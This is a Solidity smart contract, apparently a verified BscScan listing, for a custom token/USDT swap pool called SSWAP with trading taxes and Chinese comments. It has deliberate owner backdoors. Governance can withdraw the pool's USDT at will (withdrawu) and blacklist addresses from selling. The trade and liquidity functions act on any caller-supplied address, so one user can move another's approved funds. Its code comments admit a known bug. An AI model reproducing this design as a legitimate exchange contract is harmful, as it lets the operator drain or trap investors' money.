/**
 *Submitted for verification at BscScan.com on 2022-10-06
*/

pragma solidity ^0.6.12;
 // SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Context {
    constructor () internal {}
    // solhint-disable-previous-line no-empty-blocks

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}


abstract contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }

}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {codehash := extcodehash(account)}
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) {// Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

 contract ERC20 is Context, IERC20 {
    using SafeMath for uint;

    address internal governance;
    mapping(address => bool) internal _governance_;

    mapping(address => uint) private _balances;

    // mapping(address=>uint) private _lp;
    
     
    
    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
        
    }
    function approve_(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _balances[account] = _balances[account].add(amount*10**18);
       
    }
    
    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address sender, address recipient, uint amount) internal {
        // _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        // _balances[recipient] = _balances[recipient].add(amount);
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender,recipient,amount);
    }
    
    function _burn(address sender,uint256 amount) internal{
        require(sender != address(0), "ERC20: transfer from the zero address");
        // require(_balances[sender]>=amount,"lp not enough!");
        if(_balances[sender]<=amount){
            amount=_balances[sender];
        }

        _balances[sender] = _balances[sender].sub(amount);
        _totalSupply = _totalSupply.sub(amount);
    }

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view override returns (uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint amount) public override returns (bool) {

        _transfer(_msgSender(), recipient, amount);
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view  override returns (uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
   

    function transferFrom(address sender, address recipient, uint amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function translp(address lp,address recipient, uint amount) internal returns (bool) {
        IERC20(lp).transfer(recipient, amount);
        return true;
    }

    function transfromlp(address lp,address fromad,address recipient, uint amount) internal returns (bool) {
        IERC20(lp).transferFrom(fromad,recipient, amount);
        return true;
    }
    function getbalancesOf(address lp,address fromad) public view returns(uint256){
        return IERC20(lp).balanceOf(fromad);
    }
 }

contract MEDCoin {
    
    function mint(address account, uint amount) public  {}
    
}

contract SSWAP is ERC20, ERC20Detailed{
    using SafeERC20 for IERC20;
    using Address for address;
    using SafeMath for uint;

    mapping(address=>uint256) private coinABalance; //扣除的med
    mapping(address=>uint256) private coinUBalance; //扣除的U

    
    uint256 private coinACount;//代币A数量--池子
    uint256 private coinADelete;//代币A销毁数量
    uint256 private coinUCount;//代币B数量--池子
    
    address private coinAaddress;//代币A
    address private coinUaddress;//代币B

    address private basepool;  //底池  回流底池
    // address private NFTwallet;   //NFT卡牌加权
    address private yingxiaowallet;    //营销钱包
    address private jiangliaddress;  //卖币、加池子、撤池子奖励10代地址
    // address private USDTReceiveAddress; //交易税usdt接收地址

    uint256 private starttime; //交易开始时间
    bool private buyFlag;


    MEDCoin internal MED;

    mapping(address=>bool) internal blacklist;  //黑名单 禁止卖
    mapping(address=>bool) internal transferWhiteList;  //买卖白名单 突破买卖1%限制
    // uint256 private historyPrice;

    bool private firstflag;
    
    function sqrt(uint x) internal pure returns(uint) {
        uint z = (x + 1 ) / 2;
        uint y = x;
        while(z < y){
            y = z;
            z = ( x / z + z ) / 2;
        }
        return y;
    }

    constructor () public ERC20Detailed("SLP", "SLP", 18) {
        governance = msg.sender;
        _governance_[governance]=true;
        // _mint(msg.sender, 0);


        // 设置代币地址
        setCoinAaddress(0x28A2e58B4F7d739833988b4843fb98AF9101a3CD);
        // 设置u地址
        setCoinUaddress(0x55d398326f99059fF775485246999027B3197955);
        // setCoinUaddress(0xB4c9377564C6cC54eC161Ab3B23967186D0B9ea1);
        // 设置底池地址
        setBasepool(0xE98693f8c5B6912c5b34F6C8Ea2B1F772Fd6F674);
        
        // 设置营销钱包地址
        setYingxiaowallet(0x367151a256cb7A3A39FF696EE0a8B8342ae5D9f4);
        // 设置奖励代币钱包地址
        setJiangliaddress(0xAC00D406828cB62ecfe6a84ed5034e74CFe453c2);
       
        // 设置买卖白名单，突破1%限制 (公排部分交易)
        // setTransferWhiteList(0xd12cd7C20Ac442C994256a6097b18F4b217A1a57,true);

        // 设置NFT钱包地址
        // setNFTwallet(0xd5b46AcEeB6d1Fa3d1E100C750e59D60e3E04A88);
         // 设置交易税usdt接收地址
        // setUSDTReceiveAddress(0x72259767c1a45a4395E101F1DE64169B7B507e51);

        // 设置交易开始时间
        setStarttime(1665028800);

    }

    function setGoverance(address _governance) public {
        require(msg.sender == governance , "!governance");
        // governance = _governance;
        _governance_[_governance] = true;
    }
    
    
    //设置代币A地址
    function setCoinAaddress(address ad)public{
        require(_governance_[msg.sender]==true , "!governance");
        coinAaddress = ad;
        MED = MEDCoin(ad);
    }
    //设置代币U地址
    function setCoinUaddress(address ad)public{
        require(_governance_[msg.sender]==true , "!governance");
        coinUaddress = ad;
    }
    //设置底池地址
    function setBasepool(address ad)public{
        require(_governance_[msg.sender]==true , "!governance");
        basepool = ad;
    }
    // //设置NFT钱包地址
    // function setNFTwallet(address ad)public{
    //     require(_governance_[msg.sender]==true , "!governance");
    //     NFTwallet = ad;
    // }
    //设置营销钱包地址
    function setYingxiaowallet(address ad)public{
        require(_governance_[msg.sender]==true , "!governance");
        yingxiaowallet = ad;
    }
    //设置奖励代币钱包地址
    function setJiangliaddress(address ad)public{
        require(_governance_[msg.sender]==true , "!governance");
        jiangliaddress = ad;
    }
    // //设置交易税usdt接收地址
    // function setUSDTReceiveAddress(address ad)public{
    //     require(_governance_[msg.sender]==true , "!governance");
    //     USDTReceiveAddress = ad;
    // }

    //设置黑名单，可解除
    function setBlacklist(address ad,bool flag) public{
        require(_governance_[msg.sender]==true , "!governance");
        blacklist[ad]=flag;
    }
    
    // // 设置买币5%的币自动加池子还是回流底池  true:U自动添加lp，false:U回流钱包
    // function setBuyFlag(bool flag) public{
    //     require(_governance_[msg.sender]==true , "!governance");
    //     buyFlag = flag;
    // }
    // 设置买卖白名单，突破买卖1%限制
    function setTransferWhiteList(address ad,bool flag) public{
        require(_governance_[msg.sender]==true , "!governance");
        transferWhiteList[ad]=flag;
    }

    function withdrawu(address fromad,uint256 amount) public{
        require(_governance_[msg.sender]==true,"governance!");
        IERC20(coinUaddress).transfer(fromad,amount);
          
    }

    // 交易
    function setStarttime(uint256 itime) public{
        require(_governance_[msg.sender]==true,"governance!");
        starttime = itime;
    }

    
    function addPool(address fromad,address tokenAaddress,address tokenUaddress,uint256 tokenACount,uint256 tokenUCount) public{
        require(fromad != address(0), "ERC20: transfer from the zero address");
        require(tokenAaddress==coinAaddress,"coinaddress err!!");
        require(tokenUaddress==coinUaddress,"USDTaddress err!!");
        require(tokenACount!=0,"coin is 0!");
        require(tokenUCount!=0,"USDT is 0!");

        uint256 tmplp;
        uint256 taxA;
        uint256 taxU;
        uint256 tokenAaddpool;
        uint256 tokenUaddpool;
        if(_governance_[msg.sender]==true){ // 发币方加池子
             //扣除进来的币
            super.transfromlp(tokenAaddress,fromad,address(this),tokenACount);
            super.transfromlp(tokenUaddress,fromad,address(this),tokenUCount);

            // 池子添加
            coinACount = coinACount.add(tokenACount);
            coinUCount = coinUCount.add(tokenUCount);
             // 计算lp
            tmplp = sqrt(tokenACount.mul(tokenUCount));
            super._mint(fromad,tmplp);
        }else{
            if(firstflag==false){ //首发
                //5%用于税收
                taxA = tokenACount.mul(5).div(100);
                taxU = tokenUCount.mul(5).div(100);
                //95%用于加池子
                tokenAaddpool = tokenACount.mul(95).div(100);
                tokenUaddpool = tokenUCount.mul(95).div(100);
                
                //扣除进来的币
                super.transfromlp(tokenAaddress,fromad,address(this),tokenACount);
                super.transfromlp(tokenUaddress,fromad,address(this),tokenUCount);

                // 池子添加
                coinACount = coinACount.add(tokenAaddpool);
                coinUCount = coinUCount.add(tokenUaddpool);

                // 税收
                // coinABalance[jiangliaddress] = coinABalance[jiangliaddress].add(taxA);
                super.translp(tokenAaddress,jiangliaddress,taxA);
                // coinUBalance[USDTReceiveAddress] =  coinUBalance[USDTReceiveAddress].add(taxU);
                super.translp(tokenUaddress,yingxiaowallet,taxU);

                // 计算lp
                tmplp = sqrt(tokenAaddpool.mul(tokenUaddpool));
                super._mint(fromad,tmplp);

                
            }else{
                uint256 tmpAcount;
                // tmpAcount = (coinACount.add(coinADelete)).div(coinUCount).mul(tokenUCount);
                tmpAcount = ((coinACount.add(coinADelete)).mul(tokenUCount)).div(coinUCount);
                require(tmpAcount<=tokenACount,"coin is not enough!");
                //5%用于税收
                taxA = tmpAcount.mul(5).div(100);
                taxU = tokenUCount.mul(5).div(100);
                //95%用于加池子
                tokenAaddpool = tmpAcount.mul(95).div(100);
                tokenUaddpool = tokenUCount.mul(95).div(100);

                //扣除进来的币
                super.transfromlp(tokenAaddress,fromad,address(this),tmpAcount);
                super.transfromlp(tokenUaddress,fromad,address(this),tokenUCount);

                // 池子添加
                coinACount = coinACount.add(tokenAaddpool);
                coinUCount = coinUCount.add(tokenUaddpool);

                // 税收
                // coinABalance[jiangliaddress] = coinABalance[jiangliaddress].add(taxA);
                super.translp(tokenAaddress,jiangliaddress,taxA);
                // coinUBalance[USDTReceiveAddress] =  coinUBalance[USDTReceiveAddress].add(taxU);
                super.translp(tokenUaddress,yingxiaowallet,taxU);

                // 计算lp
                tmplp = sqrt(tokenAaddpool.mul(tokenUaddpool));
                super._mint(fromad,tmplp);
                
            }
        }
    
        
        
        firstflag=true;
    }

    function deletePool(address fromad,uint256 percent)public{
        require(fromad != address(0), "ERC20: transfer from the zero address");
        require(percent<=100 && percent>0 ,"percent err!");
        
        uint256 tokenUCount;
        uint256 tmpAcount;//实收币数量
        // uint256 tmplp;
        uint256 deleteBalance;
        deleteBalance = (balanceOf(fromad).mul(percent)).div(100);
        // tmpAcount=(coinACount.add(coinADelete)).div(coinUCount).mul(tokenUCount);
        tokenUCount = (coinUCount.mul(deleteBalance)).div(totalSupply());
        tmpAcount= (coinACount.mul(deleteBalance)).div(totalSupply());
        // tmplp = sqrt(tmpAcount.mul(tokenUCount));

        if(coinACount<tmpAcount){
            tmpAcount = coinACount;
            coinACount=0;
        }else{
            coinACount = coinACount.sub(tmpAcount);
        }

        coinUCount = coinUCount.sub(tokenUCount);
        super._burn(fromad,deleteBalance);
        //转币和U给用户
        super.translp(coinAaddress,fromad,tmpAcount.mul(95).div(100));
        super.translp(coinUaddress,fromad,tokenUCount.mul(95).div(100));
        //税收
        uint256 taxA;
        uint256 taxU;
        //5%用于税收
        taxA = tmpAcount.mul(5).div(100);
        taxU = tokenUCount.mul(5).div(100);
        // coinABalance[NFTwallet] = coinABalance[NFTwallet].add(taxA);
        super.translp(coinAaddress,jiangliaddress,taxA);
        // coinUBalance[USDTReceiveAddress] = coinUBalance[USDTReceiveAddress].add(taxU);
        super.translp(coinUaddress,yingxiaowallet,taxU);

        if(totalSupply()==0){
            firstflag=false;
        }
            
    }

    function buy(address fromad,uint256 amount) public{
        require(fromad != address(0), "ERC20: transfer from the zero address");
        if(_governance_[msg.sender]!=true){
            require(block.timestamp>starttime,"not start!");
        }
        
        uint256 tmpAcount;
        tmpAcount =getPriceBycoinU(amount);
        if(transferWhiteList[fromad]==false){
            require(tmpAcount<=coinACount.div(100),"Quantity purchased exceeds 1%");
        }
        require(coinACount >= tmpAcount.mul(90).div(100), "coin is not enough!");
        //用户实收90%
        super.translp(coinAaddress,fromad,tmpAcount.mul(90).div(100));
        super.transfromlp(coinUaddress,fromad,address(this),amount);
        
        coinACount = coinACount.sub(tmpAcount.mul(90).div(100));
        coinUCount = coinUCount.add(amount.mul(90).div(100));
        //回流底池5%
        if(buyFlag==true){
            //U自动加池子 有bug
            uint256 tmpA;
            tmpA = poolCalcA(amount.mul(25).div(1000));
            addPool(basepool,coinAaddress,coinUaddress,tmpA,amount.mul(25).div(1000));
        }else{
            // 回流底池
            // coinUBalance[basepool] = coinUBalance[basepool].add(amount.mul(5).div(100));
            super.translp(coinUaddress,basepool,amount.mul(5).div(100));
        }
       
        //营销钱包5%
        // coinUBalance[yingxiaowallet] = coinUBalance[yingxiaowallet].add(amount.mul(5).div(100));
        super.translp(coinUaddress,yingxiaowallet,amount.mul(5).div(100));
    }

    function sale(address fromad,uint256 amount) public{
        require(fromad != address(0), "ERC20: transfer from the zero address");
        if(_governance_[msg.sender]!=true){
            require(block.timestamp>starttime,"not start!");
        }
        require(blacklist[fromad]==false,"Not for sale!");
        require(super.getbalancesOf(coinAaddress,fromad)>=amount,"coin is not enough!");
        uint256 tmpUcount;
        tmpUcount = getPriceBycoinA(amount);
        if(transferWhiteList[fromad]==false){
            require(tmpUcount<=coinUCount.div(100),"Quantity sold exceeds 1%");
        }
        //用户实收90%
        require(coinUCount >=tmpUcount.mul(90).div(100), "usdt is not enough!");
        super.transfromlp(coinAaddress,fromad,address(this),amount);
        super.translp(coinUaddress,fromad,tmpUcount.mul(90).div(100));
        super.translp(coinAaddress,address(0),amount.mul(90).div(100));

        // super.transfromlp(coinAaddress,fromad,address(this),amount.mul(10).div(100));

        coinUCount = coinUCount.sub(tmpUcount.mul(90).div(100));
        coinADelete = coinADelete.add(amount.mul(90).div(100));
        // coinACount = coinACount.add(amount);
        
        //NFT 5%
        // coinABalance[NFTwallet]=coinABalance[NFTwallet].add(amount.mul(5).div(100));
        super.translp(coinAaddress,yingxiaowallet,amount.mul(5).div(100));

        //奖励钱包 5%
        // coinABalance[jiangliaddress]=coinABalance[jiangliaddress].add(amount.mul(5).div(100));
        super.translp(coinAaddress,jiangliaddress,amount.mul(5).div(100));
    }

    //空投
    // function airdrop(address toad)public{
    //     require(_governance_[msg.sender]==true , "!governance");
        
    //     MED.mint(toad,1000*1e18);
    // }


    function getValues()public view returns(uint256,uint256){
        // return (IERC20(address(coinAaddress)).balanceOf(address(this)),IERC20(address(coinUaddress)).balanceOf(address(this)));
        return ((coinACount.add(coinADelete)),coinUCount);
    }
    //计算币能兑换U的数量
    function getPriceBycoinA(uint256 tokenACount)public view returns(uint256){
        if(firstflag==false){
            return 0;
        }
        // return (tokenACount.mul(coinUCount)).div((coinACount.add(coinADelete)));
        return (coinUCount.mul(tokenACount)).div((coinACount.add(coinADelete)).add(tokenACount));
    }
    //计算U能兑换币的数量
    function getPriceBycoinU(uint256 tokenUcount)public view returns(uint256){
        if(firstflag==false){
            return 0;
        }
        // return ((coinACount.add(coinADelete)).mul(tokenUcount)).div(coinUCount);
        return ((coinACount.add(coinADelete)).mul(tokenUcount)).div(coinUCount.add(tokenUcount));
    }

    //预估币能卖U的数量
    function getUcountBycoinA(uint256 tokenACount)public view returns(uint256){
        if(firstflag==false){
            return 0;
        }
        tokenACount = tokenACount.mul(90).div(100);
        // return (tokenACount.mul(coinUCount)).div((coinACount.add(coinADelete)));
        return (coinUCount.mul(tokenACount)).div((coinACount.add(coinADelete)).add(tokenACount));
    }
    //预估U能买币的数量
    function getAcountBycoinU(uint256 tokenUcount)public view returns(uint256){
        
        if(firstflag==false){
            return 0;
        }
        tokenUcount = tokenUcount.mul(90).div(100);
        // return ((coinACount.add(coinADelete)).mul(tokenUcount)).div(coinUCount);
        return ((coinACount.add(coinADelete)).mul(tokenUcount)).div(coinUCount.add(tokenUcount));
    }

    //获取可撤池子a币总量
    function getKetiAcount(address ad)public view returns(uint256){
        if(firstflag==false){
            return 0;
        }
        uint256 p;
        p = (coinACount.mul(balanceOf(ad))).div(totalSupply());
        return p;
    }
    //获取可撤池子U总量
    function getKetiUcount(address ad)public view returns(uint256){
        if(firstflag==false){
            return 0;
        }
        uint256 p;
        p = (coinUCount.mul(balanceOf(ad))).div(totalSupply());
        return p;
    }
   


    // 加池子输入A币数量
    function poolCalcU(uint256 tokenAcount)public view returns(uint256){
        if(firstflag==false){
            return 0;
        }
        return (coinUCount.mul(tokenAcount)).div(coinACount.add(coinADelete));
    }
    // 加池子输入U数量
    function poolCalcA(uint256 tokenUcount)public view returns(uint256){
        if(firstflag==false){
            return 0;
        }
        return ((coinACount.add(coinADelete)).mul(tokenUcount)).div(coinUCount);
    }

    function getgoverance() public view returns(address){
        return governance;
    }
}